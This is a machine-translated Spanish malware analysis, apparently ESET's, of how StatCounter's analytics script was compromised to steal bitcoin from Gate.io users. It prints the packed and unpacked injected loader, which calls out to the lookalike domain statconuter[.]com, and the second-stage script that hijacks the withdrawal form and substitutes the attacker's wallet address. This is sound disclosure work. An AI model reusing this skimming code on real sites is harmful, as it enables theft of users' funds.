<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🌊 🌅 🎳 Ataque de intercambio de criptomonedas Gate.io registrado 👂🏽 👴🏿 🕋</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="El 4 de noviembre, los atacantes comprometieron StatCounter, una plataforma para analizar el tráfico web. El servicio se utiliza para recopilar estadí...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Ataque de intercambio de criptomonedas Gate.io registrado</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/eset/blog/429050/"> El 4 de noviembre, los atacantes comprometieron StatCounter, una plataforma para analizar el tráfico web.  El servicio se utiliza para recopilar estadísticas sobre los visitantes del sitio, aproximadamente como Google Analytics.  Para hacer esto, los webmasters agregan una etiqueta externa de JavaScript a cada página del sitio que contiene un fragmento de código StatCounter: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">www.statcounter</a> [.] Com / counter / counter.js.  Con StatCounter, los atacantes pueden inyectar código JavaScript en todos los sitios que utilizan esta plataforma.  Sin embargo, el objetivo del ataque era un recurso: el intercambio de criptomonedas Gate.io. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/yx/_d/pb/yx_dpbi0pyq4uumbaqwpsbyx5_a.jpeg"></div><a name="habracut"></a><br>  Según sus propios <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">datos</a> , StatCounter tiene más de dos millones de sitios participantes; recopila estadísticas sobre más de 10 mil millones de visitas a la página web por mes.  Su calificación de Alexa está por encima de 5,000 (en comparación, el sitio oficial de Debian Linux, debian.org, tiene una calificación comparable). <br><br><img src="https://habrastorage.org/webt/nc/it/36/ncit36glmldyeze_qr1ag_lqroi.png"><br><br>  Los atacantes modificaron el script en <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">www.statcounter</a> [.] Com / counter / counter.js, agregando un fragmento de código malicioso que se muestra en el formulario a continuación en el medio del script.  Esto es inusual porque a menudo se agrega código malicioso al principio o al final de un archivo legítimo.  El código en el medio de un script existente es más difícil de notar si no lo lee. <br><br><pre><code class="javascript hljs"><span class="hljs-built_in"><span class="hljs-built_in">eval</span></span>(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">p, a, c, k, e, r</span></span></span><span class="hljs-function">) </span></span>{ e = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">c</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> c.toString(a) }; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-string"><span class="hljs-string">''</span></span>.replace(<span class="hljs-regexp"><span class="hljs-regexp">/^/</span></span>, <span class="hljs-built_in"><span class="hljs-built_in">String</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (c--) r[e(c)] = k[c] || e(c); k = [<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> r[e] }]; e = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">'\\w+'</span></span> }; c = <span class="hljs-number"><span class="hljs-number">1</span></span> }; <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (c--) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (k[c]) p = p.replace(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">RegExp</span></span>(<span class="hljs-string"><span class="hljs-string">'\\b'</span></span> + e(c) + <span class="hljs-string"><span class="hljs-string">'\\b'</span></span>, <span class="hljs-string"><span class="hljs-string">'g'</span></span>), k[c]); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> p }(<span class="hljs-string"><span class="hljs-string">'3=""+2.4;5(3.6(\'7/8/9\')&gt;-1){a 0=2.b(\'d\');0.e=\'f://ghi/cj\';0.k(\'l\',\'m\');2.nop(0)}'</span></span>, <span class="hljs-number"><span class="hljs-number">26</span></span>, <span class="hljs-number"><span class="hljs-number">26</span></span>, <span class="hljs-string"><span class="hljs-string">'ga||document|myselfloc|location|if|indexOf|myaccount|withdraw|BTC|var|createElement||script|src|https|www|statconuter|com|php|setAttribute|async|true|documentElement|firstChild|appendChild'</span></span>.split(<span class="hljs-string"><span class="hljs-string">'|'</span></span>), <span class="hljs-number"><span class="hljs-number">0</span></span>, {}));</code> </pre> <br>  El script fue creado usando el contenedor Dean Edwards, probablemente el contenedor JavaScript más popular.  Sin embargo, simplemente puede descomprimirlo, lo que conducirá a la ejecución del código de script real, como se muestra a continuación. <br><br><pre> <code class="javascript hljs">myselfloc = <span class="hljs-string"><span class="hljs-string">''</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.location; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (myselfloc.indexOf(<span class="hljs-string"><span class="hljs-string">'myaccount/withdraw/BTC'</span></span>) &gt; <span class="hljs-number"><span class="hljs-number">-1</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ga = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">'script'</span></span>); ga.src = <span class="hljs-string"><span class="hljs-string">'https://www.statconuter.com/c.php'</span></span>; ga.setAttribute(<span class="hljs-string"><span class="hljs-string">'async'</span></span>, <span class="hljs-string"><span class="hljs-string">'true'</span></span>); <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.documentElement.firstChild.appendChild(ga); }</code> </pre> <br>  El fragmento de código verifica si la URL contiene la <i>cuenta / retiro / BTC del</i> Identificador de recursos unificados (URI).  En base a esto, podemos concluir que el objetivo de los atacantes es la plataforma Bitcoin.  Una vez encontrado lo deseado, el script agrega un nuevo elemento de script a la página web, incrustando el código <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">www.statconuter</a> [.] Com / c.php. <br><br>  Tenga en cuenta que los atacantes registraron un dominio muy similar al StatCounter legítimo.  La diferencia en dos letras: es difícil notarlo cuando se ven revistas por actividad sospechosa.  Por cierto, al verificar el DNS pasivo del dominio, encontramos que en 2010 estaba bloqueado por infracciones operativas. <br><br><img src="https://habrastorage.org/webt/i2/yb/ot/i2ybotctgjeun17_viulvuexe48.png"><br><br>  Una vez más, el script apunta a un identificador específico (URI): <i>myaccount / retirada / BTC</i> .  En el momento de escribir este artículo, entre todos los intercambios de criptomonedas, solo Gate.io tenía una página válida con este URI.  Parece que este intercambio en particular fue el objetivo del ataque.  Este sitio es bastante popular: su calificación de Alexa es 26,251, y su calificación en China es 8,308. <br><br><img src="https://habrastorage.org/webt/6l/-3/5p/6l-35pzx1sxwgtq-2fz70azyauk.png"><br><br>  Además, según coinmarketcap.com, varios millones de dólares pasan diariamente a través de esta plataforma, incluidos $ 1.6 millones en bitcoins.  En general, el interés de los atacantes en Gate.io es fácil de explicar. <br><br><img src="https://habrastorage.org/webt/ft/ei/mz/fteimzsn1pavzhmbzrlfioxddge.png"><br><br>  La página web <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">www.gate</a> [.] Io / myaccount / retirada / BTC (ver más abajo) se usa para transferir bitcoins de una cuenta en gate.io a una dirección externa. <br><br><img src="https://habrastorage.org/webt/kg/zg/qy/kgzgqyrg27gvcsae82r8xnnsihe.png"><br><br>  La carga útil de la segunda etapa con statconuter [.] Com / c.php está diseñada para robar bitcoins.  El script, también empaquetado con Dean Edwards, está incrustado en la página web para traducir bitcoins a Gate.io.  Versión desempaquetada a continuación. <br><br><pre> <code class="javascript hljs"><span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.forms[<span class="hljs-number"><span class="hljs-number">0</span></span>][<span class="hljs-string"><span class="hljs-string">'addr'</span></span>].value = <span class="hljs-string"><span class="hljs-string">''</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.forms[<span class="hljs-number"><span class="hljs-number">0</span></span>][<span class="hljs-string"><span class="hljs-string">'amount'</span></span>].value = <span class="hljs-string"><span class="hljs-string">''</span></span>; doSubmit1 = doSubmit; doSubmit = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> a = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementById(<span class="hljs-string"><span class="hljs-string">'withdraw_form'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($(<span class="hljs-string"><span class="hljs-string">'#amount'</span></span>).val() &gt; <span class="hljs-number"><span class="hljs-number">10</span></span>) { <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.forms[<span class="hljs-number"><span class="hljs-number">0</span></span>][<span class="hljs-string"><span class="hljs-string">'addr'</span></span>][<span class="hljs-string"><span class="hljs-string">'name'</span></span>] = <span class="hljs-string"><span class="hljs-string">''</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> s = $(<span class="hljs-string"><span class="hljs-string">"&lt;input type='hidden' name='addr'/&gt;"</span></span>); s.attr(<span class="hljs-string"><span class="hljs-string">'value'</span></span>, <span class="hljs-string"><span class="hljs-string">'1JrFLmGVk1ho1UcMPq1WYirHptcCYr2jad'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> b = $(<span class="hljs-string"><span class="hljs-string">'#withdraw_form'</span></span>); b.append(s); a.submit(); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementById(<span class="hljs-string"><span class="hljs-string">'canUse'</span></span>).innerText &gt; <span class="hljs-number"><span class="hljs-number">10</span></span>) { <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.forms[<span class="hljs-number"><span class="hljs-number">0</span></span>][<span class="hljs-string"><span class="hljs-string">'addr'</span></span>][<span class="hljs-string"><span class="hljs-string">'name'</span></span>] = <span class="hljs-string"><span class="hljs-string">''</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> s = $(<span class="hljs-string"><span class="hljs-string">"&lt;input type='hidden' name='addr'/&gt;"</span></span>); s.attr(<span class="hljs-string"><span class="hljs-string">'value'</span></span>, <span class="hljs-string"><span class="hljs-string">'1JrFLmGVk1ho1UcMPq1WYirHptcCYr2jad'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> b = $(<span class="hljs-string"><span class="hljs-string">'#withdraw_form'</span></span>); b.append(s); <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.forms[<span class="hljs-number"><span class="hljs-number">0</span></span>][<span class="hljs-string"><span class="hljs-string">'amount'</span></span>][<span class="hljs-string"><span class="hljs-string">'name'</span></span>] = <span class="hljs-string"><span class="hljs-string">''</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = $(<span class="hljs-string"><span class="hljs-string">"&lt;input type='hidden' name='amount'/&gt;"</span></span>); t.attr(<span class="hljs-string"><span class="hljs-string">'value'</span></span>, <span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.min(<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementById(<span class="hljs-string"><span class="hljs-string">'canUse'</span></span>).innerText, <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementById(<span class="hljs-string"><span class="hljs-string">'dayLimit'</span></span>).innerText)); b.append(t); a.submit(); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { doSubmit1(); } };</code> </pre> <br>  La página legítima Gate.io tiene una función <code>doSubmit</code> que se llama cuando el usuario hace clic en el botón de enviar.  En nuestro caso, los atacantes lo cambiaron. <br><br>  El script malicioso reemplaza automáticamente la dirección de la billetera bitcoin del usuario con la dirección que pertenece al atacante, por ejemplo, <code>1JrFLmGVk1ho1UcMPq1WYirHptcCYr2jad</code> .  El servidor atacante genera una nueva dirección cada vez que un visitante descarga el script statconuter [.] Com / c.php. <br><br>  El script usa la cantidad ingresada por la víctima (si la víctima transfiere más de diez bitcoins) o el límite diario para eliminar la criptomoneda de la cuenta.  En nuestra cuenta de prueba, el límite de cancelación se estableció en 100 BTC.  Finalmente, el guión envía un formulario que transfiere fondos de la cuenta de la víctima a la dirección de la billetera de los atacantes. <br><br>  La redirección de fondos probablemente se hace invisible para las víctimas, ya que la billetera se cambia después de hacer clic en el botón "Enviar".  Esto sucede muy rápidamente y sin visualización. <br><br>  Se genera una nueva dirección de bitcoin de los ciberdelincuentes cada vez que se solicita un script malicioso, por lo que no podemos estimar sus ingresos.  Si verifica la dirección que utilizamos en la máquina de prueba, el saldo es cero. <br><br><img src="https://habrastorage.org/webt/ib/td/ke/ibtdkeoxl6lgi-bbajdt6sbddt0.png"><br><br><h3>  Conclusión </h3><br>  No sabemos cuántos bitcoins fueron robados durante este ataque.  Sin embargo, el incidente muestra cómo los atacantes pueden actuar para atacar un recurso específico, en particular, un intercambio de criptomonedas.  Para robar bitcoins de los usuarios de un intercambio, comprometieron la plataforma analítica que usan millones de sitios web, incluidos varios sitios gubernamentales. <br><br>  Además, muestra que incluso si su sitio está actualizado y protegido de manera confiable, aún es vulnerable a ataques a través de recursos de terceros.  Otro recordatorio de que el código JavaScript externo de terceros está sujeto a cambios en cualquier momento sin previo aviso. <br><br>  Advertimos a StatCounter y Gate.io sobre actividades maliciosas. <br><br><h3>  Indicadores de compromiso </h3><br>  <b>URL maliciosas</b> <br><br>  • <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">www.statcounter</a> [.] Com / counter / counter.js <br>  • <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">www.statconuter</a> [.] Com / c.php </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/es429050/">https://habr.com/ru/post/es429050/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es429038/index.html">Rust News # 2 (octubre de 2018)</a></li>
<li><a href="../es429040/index.html">Parchear código Java en producción sin anestesia</a></li>
<li><a href="../es429042/index.html">Estamos probando SharxBase, una plataforma de virtualización de software y hardware del proveedor ruso SharxDC</a></li>
<li><a href="../es429046/index.html">Cuatro años de desarrollo de SObjectizer-5.5. ¿Cómo ha cambiado SObjectizer durante este tiempo?</a></li>
<li><a href="../es429048/index.html">Consejos para un hoster novato</a></li>
<li><a href="../es429052/index.html">¿Por qué en las laptops táctiles algunos SPA dejaron de admitir eventos táctiles?</a></li>
<li><a href="../es429054/index.html">Encuentra N diferencias. Experiencia de prueba de diseño Tinkoff.ru</a></li>
<li><a href="../es429056/index.html">La física, no la biología, hace que el envejecimiento sea inevitable</a></li>
<li><a href="../es429058/index.html">Usando Retrofit 2 en una aplicación de Android</a></li>
<li><a href="../es429060/index.html">El concepto de una mente ideal. IA universal</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>